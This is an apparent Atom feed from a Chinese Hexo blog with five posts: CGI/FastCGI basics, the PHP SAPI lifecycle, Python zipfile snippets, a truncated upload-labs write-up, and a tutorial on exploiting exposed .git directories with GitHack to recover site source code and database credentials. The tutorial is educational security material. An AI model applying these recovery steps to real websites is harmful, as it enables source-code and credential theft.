<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-08-23T12:44:42.371Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CGI/FastCGI学习</title>
    <link href="http://yoursite.com/2019/08/23/CGI-FastCGI%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2019/08/23/CGI-FastCGI学习/</id>
    <published>2019-08-23T12:27:46.000Z</published>
    <updated>2019-08-23T12:44:42.371Z</updated>
    
    <content type="html"><![CDATA[<p>CGI学习</p><a id="more"></a><h3 id="CGI-FastCGI学习"><a href="#CGI-FastCGI学习" class="headerlink" title="CGI/FastCGI学习"></a><strong>CGI/FastCGI学习</strong></h3><p>1.CGI<br>通用网关接口（Common Gateway Interface/CGI）描述了客户端和服务器程序之间传输数据的一种标准，可以让一个客户端，从网页浏览器向执行在网络服务器上的程序请求数据。CGI 独立于任何语言的，CGI 程序可以用任何脚本语言或者是完全独立编程语言实现，只要这个语言可以在这个系统上运行。Unix shell script, Python, Ruby, PHP, perl, Tcl, C/C++, 和 Visual Basic 都可以用来编写 CGI 程序。(<a href="http://www.dwz.cn/yFFgQ" target="_blank" rel="noopener">http://www.dwz.cn/yFFgQ</a>).    </p><p>最初，CGI 是在 1993 年由美国国家超级电脑应用中心（NCSA）为 NCSA HTTPd Web 服务器开发的。这个 Web 服务器使用了 UNIX shell 环境变量 来保存从 Web 服务器传递出去的参数，然后生成一个运行 CGI 的独立的进程。cgi的处理流程如下图所示：<br><img src="/images/107.png" alt="a7621d149e89a97cf516c20a6063daab.png"></p><p>step1. web 服务器收到客户端（浏览器）的请求Http Request，启动CGI程序，并通过环境变量、标准输入传递数据<br>step2. cgi进程启动解析器、加载配置（如业务相关配置）、连接其它服务器（如数据库服务器）、逻辑处理等<br>step3. cgi程将处理结果通过标准输出、标准错误，传递给web 服务器<br>step4. web 服务器收到cgi返回的结果，构建Http Response返回给客户端，并杀死cgi进程</p><p>（2）FastCGI<br>快速通用网关接口（Fast Common Gateway Interface／FastCGI）是通用网关接口（CGI）的改进，描述了客户端和服务器程序之间传输数据的一种标准。FastCGI致力于减少Web服务器与CGI程式之间互动的开销，从而使服务器可以同时处理更多的Web请求。与为每个请求创建一个新的进程不同，FastCGI使用持续的进程来处理一连串的请求。这些进程由FastCGI进程管理器管理，而不是web服务器。(<a href="http://www.dwz.cn/yFMap" target="_blank" rel="noopener">http://www.dwz.cn/yFMap</a>)<br><img src="/images/105.png" alt="8cf70b2cbefe16a45f240a8202e812cb.png"></p><p>当进来一个请求时，Web 服务器把环境变量和这个页面请求通过一个unix domain socket(都位于同一物理服务器）或者一个IP Socket（FastCGI部署在其它物理服务器）传递给FastCGI进程。<br><img src="/images/106.png" alt="23dfd42306791f670d41ca0f8346baaf.png"></p><p>step1. Web 服务器启动时载入初始化FastCGI执行环境 。 例如IIS ISAPI、apache mod_fastcgi、nginx ngx_http_fastcgi_module、lighttpd mod_fastcgi<br>step2. FastCGI进程管理器自身初始化，启动多个CGI解释器进程并等待来自Web 服务器的连接。启动FastCGI进程时，可以配置以ip和UNIX 域socket两种方式启动。<br>step3. 当客户端请求到达Web 服务器时， Web 服务器将请求采用socket方式转发到 FastCGI主进程，FastCGI主进程选择并连接到一个CGI解释器。Web 服务器将CGI环境变量和标准输入发送到FastCGI子进程。<br>step4. FastCGI子进程完成处理后将标准输出和错误信息从同一socket连接返回Web 服务器。当FastCGI子进程关闭连接时，请求便处理完成。step5. FastCGI子进程接着等待并处理来自Web 服务器的下一个连接。</p><p>由于 FastCGI 程序并不需要不断的产生新进程，可以大大降低服务器的压力并且产生较高的应用效率。它的速度效率最少要比CGI 技术提高 5 倍以上。它还支持分布式的部署， 即 FastCGI 程序可以在web 服务器以外的主机上执行。<br>      总结：CGI 就是所谓的短生存期应用程序，FastCGI 就是所谓的长生存期应用程序。FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，不会每次都要花费时间去fork一次(这是CGI最为人诟病的fork-and-execute 模式)。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CGI学习&lt;/p&gt;
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
      <category term="内核" scheme="http://yoursite.com/categories/PHP/%E5%86%85%E6%A0%B8/"/>
    
    
  </entry>
  
  <entry>
    <title>SAPI接口</title>
    <link href="http://yoursite.com/2019/08/23/SAPI%E6%8E%A5%E5%8F%A3/"/>
    <id>http://yoursite.com/2019/08/23/SAPI接口/</id>
    <published>2019-08-23T12:08:10.000Z</published>
    <updated>2019-08-23T12:29:16.796Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PHP内核探索：从SAPI接口开始"><a href="#PHP内核探索：从SAPI接口开始" class="headerlink" title="PHP内核探索：从SAPI接口开始"></a><strong>PHP内核探索：从SAPI接口开始</strong></h3><p>SAPI:Server Application Programming Interface 服务器端应用编程端口。研究过PHP架构的同学应该知道这个东东的重要性，它提供了一个接口，使得PHP可以和其他应用进行交互数据。 本文不会详细介绍每个PHP的SAPI，只是针对最简单的CGI SAPI，来说明SAPI的机制。<br>我们先来看看PHP的架构图：<br><img src="/images/104.png" alt="05996ac51af8a4c722fb635e0cc41fc3.png"></p><p>SAPI指的是PHP具体应用的编程接口， 就像PC一样，无论安装哪些操作系统，只要满足了PC的接口规范都可以在PC上正常运行， PHP脚本要执行有很多种方式，通过Web服务器，或者直接在命令行下，也可以嵌入在其他程序中。</p><p>通常，我们使用Apache或者Nginx这类Web服务器来测试PHP脚本，或者在命令行下通过PHP解释器程序来执行。 脚本执行完后，Web服务器应答，浏览器显示应答信息，或者在命令行标准输出上显示内容。</p><p>我们很少关心PHP解释器在哪里。虽然通过Web服务器和命令行程序执行脚本看起来很不一样， 实际上它们的工作流程是一样的。命令行参数传递给PHP解释器要执行的脚本， 相当于通过url请求一个PHP页面。脚本执行完成后返回响应结果，只不过命令行的响应结果是显示在终端上。<br>脚本执行的开始都是以SAPI接口实现开始的。只是不同的SAPI接口实现会完成他们特定的工作， 例如Apache的mod_php SAPI实现需要初始化从Apache获取的一些信息，在输出内容是将内容返回给Apache， 其他的SAPI实现也类似。</p><p>SAPI提供了一个和外部通信的接口， 对于PHP5.2，默认提供了很多种SAPI， 常见的给apache的mod_php5，CGI，给IIS的ISAPI，还有Shell的CLI，本文就从CGI SAPI入手 ，介绍SAPI的机制。 虽然CGI简单，但是不用担心，它包含了绝大部分内容，足以让你深刻理解SAPI的工作原理。</p><p>SAPI是Server Application Programming Interface（服务器应用编程接口）的缩写。PHP通过SAPI提供了一组接口，供应用和PHP内核之间进行数据交互。</p><p>简单的讲，就像函数的输入和输出一样，我们通过Linux命令行执行一段PHP代码，本质是Linux的Shell通过PHP的SAPI传入一组参数，Zend引擎执行后，返回给shell，由shell显示出来的过程。同样的，通过Apache调用PHP，通过Web服务器给SAPI传入数据，Zend引擎执行后，返回给Apache，由Apache显示在页面上</p><p>PHP架构图PHP提供很多种形式的接口，包括apache、apache2filter、apache2handler、caudium、cgi 、cgi-fcgi、cli、cli-server、continuity、embed、isapi、litespeed、milter、nsapi、phttpd pi3web、roxen、thttpd、tux和webjames。但是常用的只有5种形式，CLI/CGI（命令行）、Multiprocess（多进程）、Multithreaded（多线程）、FastCGI和Embedded（内嵌）。PHP提供了一个函数查看当前SAPI接口类型：<br><code>string php_sapi_name ( void )</code></p><p>PHP的运行和加载无论使用哪种SAPI，在PHP执行脚本前后，都包含一系列事件：Module的Init(MINT)和Shutdown(MSHUTDOWN)，Request 的Init(RINT)和Shutdown(RSHUTDOWN)。 第一阶段是PHP模块初始化阶段（MINT），可以初始化扩展内部变量、分配资源和注册资源处理器，在整个PHP实例生命周期内，该过程只执行一次。<br>什么是PHP模块？通过上面的PHP架构图，在PHP中可以使用get_loaded_extensions 函数来查看所有编译并加载的模块/扩展，相当于CLI模式下的php -m。以PHP的Memcached扩展源代码为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINIT_FUNCTION(memcached) &#123;         </span><br><span class="line">        zend_class_entry ce;    </span><br><span class="line">        memcpy(&amp;memcached_object_handlers,zend_get_std_object_handlers(), sizeof(zend_object_handlers));    </span><br><span class="line">memcached_object_handlers.clone_obj = NULL;     /* 执行了一些类似的初始化操作 */     </span><br><span class="line">return SUCCESS; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二阶段是请求初始化阶段（RINT），在模块初始化并激活后，会创建PHP运行环境，同时调用所有模块注册的RINT函数，调用每个扩展的请求初始化函数 ，设定特定的环境变量、分配资源或执行其他任务，如审核。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP_RINIT_FUNCTION(memcached) &#123;         </span><br><span class="line">        /* 执行一些关于请求的初始化 */      </span><br><span class="line">        return SUCCESS; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三阶段，请求处理完成后，会调用PHP_RSHUTDOWN_FUNCTION进行回收，这是每个扩展的请求关闭函数，执行最后的清理工作。Zend引擎执行清理过程、垃圾收集、对之前的请求期间用到的每个变量执行unset。请求完成可能是执行到脚本完成，也可能是调用die()或exit()函数完成</p><p>第四阶段，当PHP生命周期结束时候，PHP_MSHUTDOWN_FUNCTION对模块进行回收处理，这是每个扩展的模块关闭函数，用于关闭自己的内核子系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP_MSHUTDOWN_FUNCTION(memcached) &#123; /* 执行关于模块的销毁工作 */ UNREGISTER_INI_ENTRIES(); return SUCCESS; &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;PHP内核探索：从SAPI接口开始&quot;&gt;&lt;a href=&quot;#PHP内核探索：从SAPI接口开始&quot; class=&quot;headerlink&quot; title=&quot;PHP内核探索：从SAPI接口开始&quot;&gt;&lt;/a&gt;&lt;strong&gt;PHP内核探索：从SAPI接口开始&lt;/strong&gt;&lt;
      
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
      <category term="内核" scheme="http://yoursite.com/categories/PHP/%E5%86%85%E6%A0%B8/"/>
    
    
  </entry>
  
  <entry>
    <title>Git源码泄露</title>
    <link href="http://yoursite.com/2019/08/23/Git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <id>http://yoursite.com/2019/08/23/Git源码泄露/</id>
    <published>2019-08-23T10:31:07.000Z</published>
    <updated>2019-08-23T11:06:23.559Z</updated>
    
    <content type="html"><![CDATA[<p>GIT源码泄露</p><a id="more"></a><h3 id="0x01简要介绍git"><a href="#0x01简要介绍git" class="headerlink" title="0x01简要介绍git"></a><strong>0x01简要介绍git</strong></h3><hr><h4 id="一、知识扫盲"><a href="#一、知识扫盲" class="headerlink" title="**一、知识扫盲"></a>**一、知识扫盲</h4><p>Git(读音为/gɪt/。)是一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。 [1]  Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。<br>说的有点官方，其实我自己的理解就是他是什么呢？就是一个软件？用来做什么？可以给我们提供一个平台来管理我们的网站源码或者网站的项目。<br><strong>什么是版本控制？</strong></p><p>现在有这样的一个场景：我们在写论文的时候，写完了提交给指导老师去审核，老师说你哪哪哪写的不好要改改，于是乎，你就屁颠屁颠的去改。一般的做法是：不直接在原论文上修改，而是复制一份，在新复制的那一份上做改动。因为如果改了论文，被老师评价说还不如上一次，让你重该，你还可以找到上一次的论文，但是如果不复制，直接在原来的论文上改动……</p><p>在上面的场景中，原论文是一个版本，新复制的论文又是一个新的版本。简单点说，我们复制原论文，产生新论文的这个过程就是版本控制。只不过这个版本控制是我们手动完成的。<br><strong>什么是版本控制系统？</strong></p><p>版本控制系统就是自动的帮我们完成上面操作的系统或者说就是一个应用程序（这里的系统不是指操作系统，而是一个应用系统，像我们做 web 项目的时候，我们经常给项目起名字叫：购物商城系统，ERP系统，and so on，那它们是操作系统吗？不是，就是一个程序）。<br><strong>版本控制系统如何帮我们控制版本？</strong></p><p>我们需要进行版本控制的文件都要提交到一个仓库（其实就是一个隐藏文件夹）里面，我们对文件做出的修改都会被这个版本控制系统侦测到，如果我们要保留这个版本的文件，就要通过版本控制系统提供的命令把文件提交到仓库里面，然后版本控制系统就会自动为我们提交的文件打上版本号。<br><strong>仓库分几种？</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本地仓库：建立在本地的文件夹。</span><br><span class="line">远程仓库：建立在互联网的服务器内的文件夹。</span><br></pre></td></tr></table></figure><p><strong>版本控制系统分为几种？</strong></p><p>分布式版本控制系统<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.配有上述两个仓库，在你的电脑上有一个本地仓库，在远程的服务器上有一个远程仓库。</span><br><span class="line">2.我们在提交文件的时候会先提交到本地仓库，然后在有网络的情况下，再从本地仓库提交到网络上的远程仓库。</span><br><span class="line">3.Git 就是一个典型的分布式版本控制系统</span><br></pre></td></tr></table></figure></p><p>集中式版本控制系统<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 只配有上述的远程仓库，当然如果你的这台电脑就充当远程服务器的角色，那远程仓库其实就在你这台电脑上。</span><br><span class="line">2.我们在提交文件的时候是直接提交到远程仓库。</span><br><span class="line">3.SVN 就是一个典型的集中式版本控制系统</span><br></pre></td></tr></table></figure></p><p><strong>什么是 Git？</strong></p><p>相信到这里大家已经理解了 Git 到底是个啥。</p><p>就是一个帮我们管理文件版本的程序，专业名称叫：分布式版本控制系统。</p><h4 id="二、要深入了解git源码泄露我们还需要了解一下控制系统中的版本库的构造："><a href="#二、要深入了解git源码泄露我们还需要了解一下控制系统中的版本库的构造：" class="headerlink" title="二、要深入了解git源码泄露我们还需要了解一下控制系统中的版本库的构造："></a><strong>二、要深入了解git源码泄露我们还需要了解一下控制系统中的版本库的构造</strong>：</h4><p><strong>创建一个版本库：git init</strong><br>( kwydwuf注: 新版 git 中应该用 git init ，不要再用 init-db 命令，具体可以通过命令 git help init 查看)<br>可以了。现在我们来为本文的写作创建一个版本库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$mkdir gittutorcn</span><br><span class="line">$cd gittutorcn</span><br><span class="line">$git init</span><br></pre></td></tr></table></figure><p>git 将会作出以下的回应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Initialized empty Git repository in/[yourpath]/.git或</span><br><span class="line">(Initialized empty Git repository in /Users/1a/gittutorcn/.git/</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这样，一个空的版本库就创建好了，并在当前目录中创建一个叫 <code>.git</code> 的子目录。你可以用<code>ls -a</code> 查看一下，并请注意其中的三项内容：</p><ul><li>一个叫 HEAD 的文件，我们现在来查看一下它的内容：<br><code>$cat.git/HEAD</code></li></ul><p>现在 <code>HEAD</code> 的内容应该是这样：<br><code>ref:refs/heads/master</code></p><p>我们可以看到，HEAD 文件中的内容其实只是包含了一个索引信息，并且，这个索引将总是指向你的项目中的当前开发分支。</p><ul><li>一个叫 objects 的子目录，它包含了你的项目中的所有对象，我们不必直接地了解到这些对象内容，我们应该关心是存放在这些对象中的项目的数据。<br>Note<br>关于 git 对象的分类，以及 git 对象数据库的说明，请参看 [Discussion]</li><li>一个叫 refs 的子目录，它用来保存指向对象的索引。<br>具体地说，子目录 refs 包含着两个子目录叫 heads 和 tags，就像他们的名字所表达的意味一样：他们存放了不同的开发分支的头的索引, 或者是你用来标定版本的标签的索引。<br>请注意：master 是默认的分支，这也是为什么 .git/HEAD 创建的时候就指向 master 的原因，尽管目前它其实并不存在。 git 将假设你会在 master 上开始并展开你以后的工作，除非你自己创建你自己的分支。<br>另外，这只是一个约定俗成的习惯而已，实际上你可以将你的工作分支叫任何名字，而不必在版本库中一定要有一个叫 master 的分支，尽管很多 git 工具都认为 master 分支是存在的。</li></ul><p><strong>提交内容</strong><br>提交内容到版本库：git commit<br>既然我们刷新了 Git 的跟踪信息，现在我们看看版本库的状态：<br><code>$git status</code></p><p>我们能看到 git 的状态提示：</p><p>#Initial commit</p><p>#Updated but not checkedin:</p><p>#(willcommit)</p><p>#newfile:example</p><p>#newfile:hello</p><p>提示信息告诉我们版本库中加入了两个新的文件，并且 git 提示我们提交这些文件，我们可以通过 git commit 命令来提交：</p><p><strong>$git commit -m “Initial commit of git tutor reposistory”</strong></p><p>查看当前的工作：<code>git diff</code><br>git diff 命令将比较当前的工作目录和版本库数据库中的差异。现在我们编辑一些文件来体验一下 git 的跟踪功能。</p><p>$echo’这段是后来加的’&gt;snake</p><p><strong>我们再来比较一下，当前的工作目录和版本库中(我们之前修改过的)的数据的差别。</strong></p><p>$git diff</p><p>差异将以典型的 patch 方式表示出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">diff--gita/snakeb/snake</span><br><span class="line">index3b85043..d79f20a100644</span><br><span class="line">---a/snake</span><br><span class="line">+++b/snake</span><br><span class="line">@@-1+1@@</span><br><span class="line">-snakezero</span><br></pre></td></tr></table></figure><p>+这段是后来加的<br>此时，我们可以再次使用组合命令 <code>git add</code> 和 <code>git commit</code> 将我们的工作提交到版本库中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$git add snake</span><br><span class="line">$git commit -m &quot;new day for git&quot;</span><br></pre></td></tr></table></figure><p>实际上，如果要提交的文件都是已经纳入 git 版本库的文件，那么不必为这些文件都应用 git add 命令之后再进行提交，下面的命令更简捷并且和上面的命令是等价的。</p><p><code>$git commit -a -m&quot;new day for git&quot;</code></p><h3 id="0x02git源码泄露"><a href="#0x02git源码泄露" class="headerlink" title="0x02git源码泄露"></a><strong>0x02git源码泄露</strong></h3><hr><p><strong>泄露前提:</strong><br>一般情况下 , 开发人员为了让版本控制和网站部署比较方便 , 在开发的时候就会走这样的流程</p><p>1.初始化仓库 , 并将仓库托管在Coding或者Github上 , 便于远程协作/备份/部署<br>2.在本地进行网站开发 , 并定时提交commit , 并push到远程托管网站<br>3.当一个阶段的开发差不多的时候 , 需要远程登陆服务器 , 通过托管网站再将发行版网站pull到Web目录下<br>4.网站正常运行</p><p><strong>这里当网站维护(开发)人员在从托管网站pull代码的时候 , 也会将这个储存了所有的版本信息的.git文件夹下载到服务器的Web目录下 , 这样的话 , 攻击者就可以利用这个目录 , 去下载git文件夹 , 就可以利用其中储存的版本控制信息 , 完全恢复网站后台的代码和目录结构 ,</strong> 当然 , 一般网站都会涉及到数据库操作 , 而一般来说 , 需要链接数据库就需要用户名/密码/端口/库名等信息 , 而这些信息肯定会在网站后台的源码里面又体现 , 因此这种情况是极其危险的 , 还有 , 一旦服务器开放了数据库的远程连接功能 , 攻击者就可以利用从源码中找到的数据库用户名和密码对远程数据库进行登陆 , 危险性不言而喻</p><p><strong>.git目录结构：</strong><br>该目录的结构如下所示：<br><code>HEAD config* description hooks/ info/ objects/ refs/</code><br>在这些结构中 description 文件仅供 GitWeb 程序使用，我们可以无需关心。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config 文件包含项目特有的配置选项；</span><br><span class="line">info 目录包含一个全局性排除（global exclude）文件，用以放置不希望被记录在 .gitignore 文件中的忽略模式（ignored patterns）；</span><br><span class="line">hooks 目录包含客户端或服务端的钩子脚本（hook scripts）。</span><br></pre></td></tr></table></figure><p>而在剩下的四个条目很重要：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HEAD 文件指示目前被检出的分支；</span><br><span class="line">index 文件保存暂存区信息；</span><br><span class="line">objects 目录存储所有数据内容；</span><br><span class="line">refs 目录存储指向数据（分支）的提交对象的指针。</span><br></pre></td></tr></table></figure><p>而在发布代码的时候，如果没有把 .git 这个目录删除，直接发布到了运行目录中。攻击者就可以通过这个文件夹，可以用来恢复源代码。<br><a href="http://www.localhost.test/.git/config" target="_blank" rel="noopener">http://www.localhost.test/.git/config</a><br>通常会用到的利用工具 GitHack ，这个工具下载下来之后操作也特别简单。<br><code>GitHack.py    http://www.localhost.test/.git/</code>它能解析 .git/index 文件，并找到工程中所有的：文件名和文件 sha1，然后去 .git/objects/ 文件夹下下载对应的文件，通过 zlib 解压文件，按原始的目录结构写入源代码。</p><p><strong>具体利用思路:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.利用爬虫递归下载.git目录的所有文件</span><br><span class="line">2.利用git命令对网站的commit历史进行查看</span><br><span class="line">3.利用git命令对网站的源码进行恢复</span><br></pre></td></tr></table></figure><p><strong>常用命令:</strong><br>git log 或者git log  +文件夹，查看网站的提交记录。log即日志就是说以前的版本。<br><code>git log flag.php</code><br><img src="en-resource://database/309051:1" alt="f41e5f33580a7f551ff3a94b6ff9882f.png"><br>查看对比两次文件内容具体修改了什么<br><code>git diff + commit</code><br><img src="en-resource://database/309053:1" alt="1bc31b3ea960c60c5eaccc49bf9195ba.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;GIT源码泄露&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞原理" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
      <category term="Git源码泄露" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/Git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>python之zipfile模块-2</title>
    <link href="http://yoursite.com/2019/08/17/python%E4%B9%8Bzipfile%E6%A8%A1%E5%9D%97-2/"/>
    <id>http://yoursite.com/2019/08/17/python之zipfile模块-2/</id>
    <published>2019-08-17T09:16:39.000Z</published>
    <updated>2019-08-17T09:19:38.343Z</updated>
    
    <content type="html"><![CDATA[<p>python之zipfile模块</p><a id="more"></a><p><strong>一、os方法：</strong><br>在Python中可以使用os.mkdir()函数创建目录（创建一级目录）。　<br>其原型如下所示：<br>os.mkdir(path)　<br>其参数path 为要创建目录的路径。　　<br>例如要在D盘下创建hello的目录　　</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os　　</span><br><span class="line">os.mkdir(<span class="string">'d:\hello'</span>)</span><br></pre></td></tr></table></figure><p>Python中的os模块用于和系统进行交互，其中os.listdir()用于返回一个由文件名和目录名组成的列表，需要注意的是它接收的参数需要是一个绝对的路径例如：<br>已知路径path = /home/python/Desktop/请输出该路径下的所有文件和目录名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mport os</span><br><span class="line">path = <span class="string">'/home/python/Desktop/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure><p>os.path.isdir()用于判断对象是否为一个目录例如：<br>已知路径path =  /home/python/Desktop/请输出该目录下包含的目录名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(path):</span><br><span class="line"><span class="keyword">if</span> os.path.isdir(i):</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure><p>os.path.isfile()用于判断对象是否为一个文件例如：<br>已知路径path =  /home/python/Desktop/请输出该目录下包含的文件名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(path):</span><br><span class="line"><span class="keyword">if</span> os.path.isfile(i):</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure><p><strong>二、压缩操作：</strong><br>正常使用:</p><p><img src="/images/103.png" alt="f2f4da94905744228daa3fca3d75d306.png"></p><p>例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">zip_file = zipfile.ZipFile(file_name, <span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> names <span class="keyword">in</span> zip_file.namelist():</span><br><span class="line">        zip_file.extract(names, path=mypath)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure><p><strong>三、附上自己的小脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">filename=<span class="string">"./9999.zip"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">filename=<span class="string">"./"</span>+str(i)+<span class="string">".zip"</span></span><br><span class="line">z=zipfile.ZipFile(filename,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> names <span class="keyword">in</span> z.namelist():</span><br><span class="line">z.extract(names)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">un_zip</span><span class="params">(file_name)</span>:</span></span><br><span class="line">    <span class="string">"""unzip zip file"""</span></span><br><span class="line">    zip_file = zipfile.ZipFile(file_name)</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_name + <span class="string">"_files"</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.mkdir(file_name + <span class="string">"_files"</span>)</span><br><span class="line">    <span class="keyword">for</span> names <span class="keyword">in</span> zip_file.namelist():  //这里的对象，按理来说应该是<span class="keyword">in</span> 我们的压缩包文件，但是这里是<span class="keyword">in</span> 压缩包里面的文件，在这里不使用压缩包名字，应该使用压缩包里面的名字，因此使用namelist。</span><br><span class="line">        zip_file.extract(names,file_name + <span class="string">"_files/"</span>)</span><br><span class="line">    zip_file.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python之zipfile模块&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>upload-labs-三</title>
    <link href="http://yoursite.com/2019/08/17/upload-labs-%E4%B8%89/"/>
    <id>http://yoursite.com/2019/08/17/upload-labs-三/</id>
    <published>2019-08-17T02:48:46.000Z</published>
    <updated>2019-08-17T07:49:13.864Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传漏洞解析</p><a id="more"></a><h4 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a><strong>第十关</strong></h4><hr><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;$msg = <span 